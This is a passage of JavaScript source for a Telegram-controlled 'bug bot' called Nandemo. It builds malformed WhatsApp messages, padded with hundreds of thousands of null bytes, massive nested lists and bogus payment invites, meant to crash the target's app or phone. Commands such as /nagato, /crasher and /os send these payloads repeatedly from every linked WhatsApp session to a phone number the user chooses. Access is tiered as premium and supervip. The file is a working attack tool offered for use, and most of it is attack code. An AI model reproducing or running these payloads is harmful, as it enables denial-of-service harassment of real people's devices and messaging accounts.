                    buttonId: "\u0000".repeat(850000),
                    buttonText: {
                      displayText: "𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            actionLink: {
              url: "t.me/rainoneday",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: jid,
              initiatedByMe: true,
            },
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: 'P',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              ctaPayload: "cta",
              disableNudge: true,
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "123132123123123@newsletter",
              serverMessageId: 1,
              newsletterName: "P",
              contentType: 3,
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
        },
      },
    },
  };

  await sock.relayMessage(jid, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: jid },
  });
}

async function InvisiPayload(sock, jid) {
      let sections = [];

      for (let i = 0; i < 10000; i++) {
        let largeText = "ꦾ".repeat(45000);

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };

      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
                mentionedJid: [jid],
                isForwarded: true,
                forwardingScore: 999,
                businessMessageForwardInfo: {
                  businessOwnerJid: jid,
                },
              },
              body: {
                text: "ꪶ𖣂ꫂ 𝗙𝗮𝗶𝗹 𝗕𝗲𝘁𝗮 - ( 𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી )         𐎟",
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              },
            },
          },
        },
      };

      await sock.relayMessage(jid, message, {
        participant: { jid: jid },
      });
    }

async function crashui(sock, jid) {
    await sock.relayMessage(jid, {
        viewOnceMessage: {
            message: {
                buttonsMessage: {
                    text: "ꪶ𖣂ꫂ 𝗙𝗮𝗶𝗹 𝙐𝙄 - ( 𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી )",
                    contentText: "ꪶ𖣂ꫂ 𝗙𝗮𝗶𝗹 𝙐𝙄 - ( 𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી )" + "\u0000".repeat(70000),
                    contextInfo: {
                        forwardingScore: 6,
                        isForwarded: true
                    },
                    headerType: 1
                }
            }
        }
    }, {});
}

async function NoIos(sock, jid) {
  await sock.relayMessage(
    jid,
    {
      paymentInviteMessage: {
        serviceType: "UPI",
        serviceType: "FBPAY",
        serviceType: "yarn_info",
        serviceType: "PENDING",
        expiryTimestamp: Date.now() + 1814400000,
      },
    },
    {
      participant: {
        jid: jid,
      },
    }
  );
}
    
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;

  // Kirim pesan dengan foto dan tombol channel
  bot.sendPhoto(chatId, "https://files.catbox.moe/k5c6co.jpg", {
    caption: `╭──(  - 𝙉𝙖𝙣𝙙𝙚𝙢𝙤 )
│ 𝘾𝙧𝙚𝙖𝙩𝙤𝙧 : @cellasta
│ 𝙉𝙖𝙢𝙚 𝘽𝙤𝙩 : 𝙉𝙖𝙣𝙙𝙚𝙢𝙤
│ 𝙑𝙀𝙍𝙎𝙄𝙊𝙉 : 2.3
│ 𝘾𝙤𝙣𝙣𝙚𝙘𝙩 : ${sessions.size}
╰━━━ㅡᯓ★`,
    reply_markup: {
      inline_keyboard: [
        [{ text: "Kunjungi Channel", url: "https://t.me/isengaja8" }],
        [
          { text: "Bug Menu ☠️", callback_data: "bug_menu" },
          { text: "Owner Menuꪶ𖣂ꫂ", callback_data: "owner_menu" },
        ],
      ],
    },
  });
});
bot.on("callback_query", (callbackQuery) => {
  const data = callbackQuery.data;
  const chatId = callbackQuery.message.chat.id;

  // Jawab callback_query untuk mencegah error
  bot.answerCallbackQuery(callbackQuery.id);

  if (data === "bug_menu") {
    // Hapus pesan lama dan kirim ulang foto dengan menu Bug Menu
    bot.deleteMessage(chatId, callbackQuery.message.message_id).then(() => {
      bot.sendPhoto(chatId, "https://files.catbox.moe/k5c6co.jpg", {
        caption: `╭─────────────────
│   WELCOME TO BUGMENU  
│────────────────
│ Wassup @${callbackQuery.from.username}! 
│
│ Command List:
│
│ • /nagato
│   menampilkan button bug
│   Contoh: /nagato 628xx
│
│ 𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી V2.3
╰─────────────────`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "Back", callback_data: "start_menu" }]],
        },
      });
    });
  } else if (data === "owner_menu") {
    // Hapus pesan lama dan kirim ulang foto dengan menu Owner Menu
    bot.deleteMessage(chatId, callbackQuery.message.message_id).then(() => {
      bot.sendPhoto(chatId, "https://files.catbox.moe/k5c6co.jpg", {
        caption: `╭─────────────────
│  WELCOME TO OWNER MENU   
│────────────────
│ Wassup @${callbackQuery.from.username}! 
│
│ Command List:
│ • /addbot nomor
│ • /addprem id
│ • /delprem id
│ • /addsupervip id
│ • /delsupervip id
╰─────────────────`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "Back", callback_data: "start_menu" }]],
        },
      });
    });
  } else if (data === "start_menu") {
    // Hapus pesan lama dan kirim ulang foto dengan menu Start
    bot.deleteMessage(chatId, callbackQuery.message.message_id).then(() => {
      bot.sendPhoto(chatId, "https://files.catbox.moe/k5c6co.jpg", {
        caption: `╭──(  - 𝙉𝙖𝙣𝙙𝙚𝙢𝙤 )
│ 𝘾𝙧𝙚𝙖𝙩𝙤𝙧 : @cellasta
│ 𝙉𝙖𝙢𝙚 𝘽𝙤𝙩 : 𝙉𝙖𝙣𝙙𝙚𝙢𝙤
│ 𝙑𝙀𝙍𝙎𝙄𝙊𝙉 : 2.3
│ 𝘾𝙤𝙣𝙣𝙚𝙘𝙩 : ${sessions.size}
╰━━━ㅡᯓ★`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Kunjungi Channel", url: "https://t.me/isengaja8" }],
            [
              { text: "Bug Menu ☠️", callback_data: "bug_menu" },
              { text: "Owner Menuꪶ𖣂ꫂ", callback_data: "owner_menu" },
            ],
          ],
        },
      });
    });
  }
});
bot.on("message", (msg) => {
  const chatId = msg.chat.id;
});

const supervipFile = path.resolve("./supervip_users.js");
let supervipUsers = require("./supervip_users.js");

function isSupervip(userId) {
  return supervipUsers.includes(userId.toString());
}

bot.onText(/\/nagato (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isPremium(userId) && !isSupervip(userId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;

  bot.sendPhoto(chatId, "https://files.catbox.moe/rf8qar.jpg", {
    caption: `🔹 Mengirim bug ke *${formattedNumber}*`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "〄ForClose༽", callback_data: `crasher_${jid}` }],
        [{ text: "፠Cr⃢ash⃢Wa", callback_data: `notag_${jid}` }],
        [{ text: "⏚CrashIphone⏎", callback_data: `os_${jid}` }],
        [{ text: "✈CrashHard✇", callback_data: `manuver_${jid}` }],
        [{ text: "Unli✘Mited", callback_data: `unlimited_${jid}` }],
        [{ text: "➷SepecialyUi➹", callback_data: `combox_${jid}` }],
      ],
    },
  });
});

bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;
  const userId = callbackQuery.from.id;

  if (!isPremium(userId) && !isSupervip(userId)) {
    return bot.sendMessage(chatId, "⚠️ *Akses Ditolak*", { parse_mode: "Markdown" });
  }

  const [bugType, jid] = data.split("_");

  const bugTypes = {
    "crasher": [Bug4, InvisiPayload, InvisiPayload, Bug4],
    "notag": [Bug4, Bug3, Bug3, Bug4],
    "os": [IosMJ, IosMJ, IosMJ, NoIos, NoIos, NoIos, NoIos, NoIos],
    "combox": [Bug4, InvisiPayload, crashui, Bug4,Bug4, crashui, InvisiPayload, Bug4],
    "manuver": [Bug4, Bug3, Bug2, InvisiPayload, Bug4, Bug4],
    "unlimited": [Bug4, Bug3, Bug2, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, Bug4, Bug4],
  };

  if (!bugTypes[bugType]) {
    return;
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "⚠️ Tidak ada bot WhatsApp yang terhubung.");
  }

  bot.answerCallbackQuery(callbackQuery.id);

  let successCount = 0;
  let failCount = 0;

  for (const [botNum, sock] of sessions.entries()) {
    try {
      if (!sock.user) {
        console.log(`Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`);
        await initializeWhatsAppConnections();
        continue;
      }
      for (const bugFunction of bugTypes[bugType]) {
        await bugFunction(sock, jid);
      }
      successCount++;
    } catch (error) {
      failCount++;
    }
  }

  bot.sendMessage(
    chatId,
    `\`\`\`
╭─────────────────
│    HASIL PENGIRIMAN    
│────────────────
│ Target: ${jid}
│ Berhasil: ${successCount}
│ Gagal: ${failCount}
│ Total Bot: ${sessions.size}
╰─────────────────
\`\`\``,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/\/addsupervip (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat menambah pengguna supervip.",
      { parse_mode: "Markdown" }
    );
  }

  const newUserId = match[1].replace(/[^0-9]/g, "");

  if (!newUserId) {
    return bot.sendMessage(chatId, "⚠️ Mohon masukkan ID pengguna yang valid.");
  }

  if (supervipUsers.includes(newUserId)) {
    return bot.sendMessage(
      chatId,
      "Pengguna sudah terdaftar sebagai supervip."
    );
  }

  supervipUsers.push(newUserId);

  const fileContent = `const supervipUsers = ${JSON.stringify(
    supervipUsers,
    null,
    2
  )};\n\nmodule.exports = supervipUsers;`;

  fs.writeFile(supervipFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menyimpan pengguna ke daftar supervip."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menambahkan ID ${newUserId} ke daftar supervip.`
    );
  });
});

bot.onText(/\/delsupervip (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat menghapus pengguna supervip.",
      { parse_mode: "Markdown" }
    );
  }

  const userIdToRemove = match[1].replace(/[^0-9]/g, "");

  if (!supervipUsers.includes(userIdToRemove)) {
    return bot.sendMessage(
      chatId,
      "Pengguna tidak ditemukan dalam daftar supervip."
    );
  }

  supervipUsers = supervipUsers.filter((id) => id !== userIdToRemove);

  const fileContent = `const supervipUsers = ${JSON.stringify(
    supervipUsers,
    null,
    2
  )};\n\nmodule.exports = supervipUsers;`;

  fs.writeFile(supervipFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menghapus pengguna dari daftar supervip."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menghapus ID ${userIdToRemove} dari daftar supervip.`
    );
  });
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat melihat daftar pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  const premiumList = premiumUsers
    .map((id, index) => `${index + 1}. ${id}`)
    .join("\n");

  bot.sendMessage(
    chatId,
    `Daftar Pengguna Premium:\n${premiumList || "Tidak ada pengguna premium."}`,
    { parse_mode: "Markdown" }
  );
});
bot.onText(/\/premium/, (msg) => {
  const chatId = msg.chat.id;

  if (!isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Fitur Premium*\nAnda tidak memiliki akses ke fitur ini. Silakan upgrade ke premium.",
      { parse_mode: "Markdown" }
    );
  }

  bot.sendMessage(chatId, "Selamat! Anda memiliki akses ke fitur premium.");
});
const premiumFile = path.resolve("./premium_users.js");
let premiumUsers = require("./premium_users.js");

bot.onText(/\/addprem (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat menambah pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  const newUserId = match[1].replace(/[^0-9]/g, "");

  if (!newUserId) {
    return bot.sendMessage(chatId, "⚠️ Mohon masukkan ID pengguna yang valid.");
  }

  if (premiumUsers.includes(newUserId)) {
    return bot.sendMessage(chatId, "Pengguna sudah terdaftar sebagai premium.");
  }

  premiumUsers.push(newUserId);

  const fileContent = `const premiumUsers = ${JSON.stringify(
    premiumUsers,
    null,
    2
  )};\n\nmodule.exports = premiumUsers;`;

  fs.writeFile(premiumFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menyimpan pengguna ke daftar premium."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menambahkan ID ${newUserId} ke daftar premium.`
    );
  });
});

bot.onText(/\/delprem (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat menghapus pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  const userIdToRemove = match[1].replace(/[^0-9]/g, "");

  if (!premiumUsers.includes(userIdToRemove)) {
    return bot.sendMessage(
      chatId,
      "Pengguna tidak ditemukan dalam daftar premium."
    );
  }

  premiumUsers = premiumUsers.filter((id) => id !== userIdToRemove);

  const fileContent = `const premiumUsers = ${JSON.stringify(
    premiumUsers,
    null,
    2
  )};\n\nmodule.exports = premiumUsers;`;

  fs.writeFile(premiumFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menghapus pengguna dari daftar premium."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menghapus ID ${userIdToRemove} dari daftar premium.`
    );
  });
});

bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;

  if (!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    let botList =
      "╭─────────────────\n│    *DAFTAR BOT*    \n│────────────────\n";
    let index = 1;

    for (const [botNumber, sock] of sessions.entries()) {
      const status = sock.user ? "Terhubung" : "Tidak Terhubung";
      botList += `│ ${index}. ${botNumber}\n│    Status: ${status}\n│\n`;
      index++;
    }

    botList += `│ Total: ${sessions.size} bot\n╰─────────────────`;

    await bot.sendMessage(chatId, botList, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error in listbot:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengambil daftar bot. Silakan coba lagi."
    );
  }
});

bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

bot.onText(/\/crasher (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  try {
    // Periksa apakah pengguna berada dalam cooldown
    const lastUsage = cooldowns.get(userId);
    const now = Date.now();

    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil(
        (COOLDOWN_TIME - (now - lastUsage)) / 1000
      );
      return bot.sendMessage(
        chatId,
        `⚠️ Anda harus menunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`,
        { parse_mode: "Markdown" }
      );
    }

    // Tandai waktu terakhir pengguna menjalankan perintah
    cooldowns.set(userId, now);

    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(
        chatId,
        "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
        { parse_mode: "Markdown" }
      );
    }

    const [targetNumber, ...messageWords] = match[1].split(" ");
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const statusMessage = await bot.sendMessage(
      chatId,
      `Mengirim pesan ke ${formattedNumber} menggunakan ${sessions.size} bot...`
    );

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        successCount++;
      } catch (error) {
        failCount++;
      }
    }

    await bot.editMessageText(
      `╭─────────────────
│    *HASIL PENGIRIMAN*    
│────────────────
│ Target: ${formattedNumber}
│ Berhasil: ${successCount}
│ Gagal: ${failCount}
│ Total Bot: ${sessions.size}
╰─────────────────`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    await bot.sendMessage(
      chatId,
      `Terjadi kesalahan: ${error.message}\nSilakan coba lagi.`
    );
  }
});
bot.onText(/\/notag (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  try {
    // Periksa apakah pengguna berada dalam cooldown
    const lastUsage = cooldowns.get(userId);
    const now = Date.now();

    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil(
        (COOLDOWN_TIME - (now - lastUsage)) / 1000
      );
      return bot.sendMessage(
        chatId,
        `⚠️ Anda harus menunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`,
        { parse_mode: "Markdown" }
      );
    }

    // Tandai waktu terakhir pengguna menjalankan perintah
    cooldowns.set(userId, now);

    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(
        chatId,
        "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
        { parse_mode: "Markdown" }
      );
    }

    const [targetNumber, ...messageWords] = match[1].split(" ");
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const statusMessage = await bot.sendMessage(
      chatId,
      `Mengirim Notag ke ${formattedNumber} menggunakan ${sessions.size} bot...`
    );

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug4(sock, jid);
        await Bug2(sock, jid);
        await Bug2(sock, jid);
        await Bug4(sock, jid);
        
        successCount++;
      } catch (error) {
        failCount++;
      }
    }

    await bot.editMessageText(
      `╭─────────────────
│    *HASIL PENGIRIMAN*    
│────────────────
│ Target: ${formattedNumber}
│ Berhasil: ${successCount}
│ Gagal: ${failCount}
│ Total Bot: ${sessions.size}
╰─────────────────`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    await bot.sendMessage(
      chatId,
      `Terjadi kesalahan: ${error.message}\nSilakan coba lagi.`
    );
  }
});
bot.onText(/\/os (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  try {
    // Periksa apakah pengguna berada dalam cooldown
    const lastUsage = cooldowns.get(userId);
    const now = Date.now();

    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil(
        (COOLDOWN_TIME - (now - lastUsage)) / 1000
      );
      return bot.sendMessage(
        chatId,
        `⚠️ Anda harus menunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`,
        { parse_mode: "Markdown" }
      );
    }

    // Tandai waktu terakhir pengguna menjalankan perintah
    cooldowns.set(userId, now);

    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(
        chatId,
        "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
        { parse_mode: "Markdown" }
      );
    }

    const [targetNumber, ...messageWords] = match[1].split(" ");
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const statusMessage = await bot.sendMessage(
      chatId,
      `Mengirim Os ke ${formattedNumber} menggunakan ${sessions.size} bot...`
    );

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        await IosMJ(sock, jid);
        await IosMJ(sock, jid);
        await IosMJ(sock, jid);
        await NewIos(sock, jid);
        await NewIos(sock, jid);
        await NewIos(sock, jid);
        await NewIos(sock, jid);
        await IosMJ(sock, jid);
        
        successCount++;
      } catch (error) {
        failCount++;
      }
    }

    await bot.editMessageText(
      `╭─────────────────
│    *HASIL PENGIRIMAN*    
│────────────────
│ Target: ${formattedNumber}
│ Berhasil: ${successCount}
│ Gagal: ${failCount}
│ Total Bot: ${sessions.size}
╰─────────────────`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    await bot.sendMessage(
      chatId,
      `Terjadi kesalahan: ${error.message}\nSilakan coba lagi.`
    );
  }
});
bot.onText(/\/manuver (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  try {
    // Periksa apakah pengguna berada dalam cooldown
    const lastUsage = cooldowns.get(userId);
    const now = Date.now();

    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil(
        (COOLDOWN_TIME - (now - lastUsage)) / 1000
      );
      return bot.sendMessage(
        chatId,
        `⚠️ Anda harus menunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`,
        { parse_mode: "Markdown" }
      );
    }

    // Tandai waktu terakhir pengguna menjalankan perintah
    cooldowns.set(userId, now);

    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(
        chatId,
        "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
        { parse_mode: "Markdown" }
      );
    }

    const [targetNumber, ...messageWords] = match[1].split(" ");
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const statusMessage = await bot.sendMessage(
      chatId,
      `Mengirim Manuver ke ${formattedNumber} menggunakan ${sessions.size} bot...`
    );

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        await Fc(sock, jid);
        await InvisiPayload(sock, jid);
        await InvisiPayload(sock, jid);
        await Fc(sock, jid);

        successCount++;
      } catch (error) {
        failCount++;
      }
    }

    await bot.editMessageText(
      `╭─────────────────
│    *HASIL PENGIRIMAN*    
│────────────────
│ Target: ${formattedNumber}
│ Berhasil: ${successCount}
│ Gagal: ${failCount}
│ Total Bot: ${sessions.size}
╰─────────────────`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    await bot.sendMessage(
      chatId,
      `Terjadi kesalahan: ${error.message}\nSilakan coba lagi.`
    );
  }
});

console.log("Bot telah dimulai...");
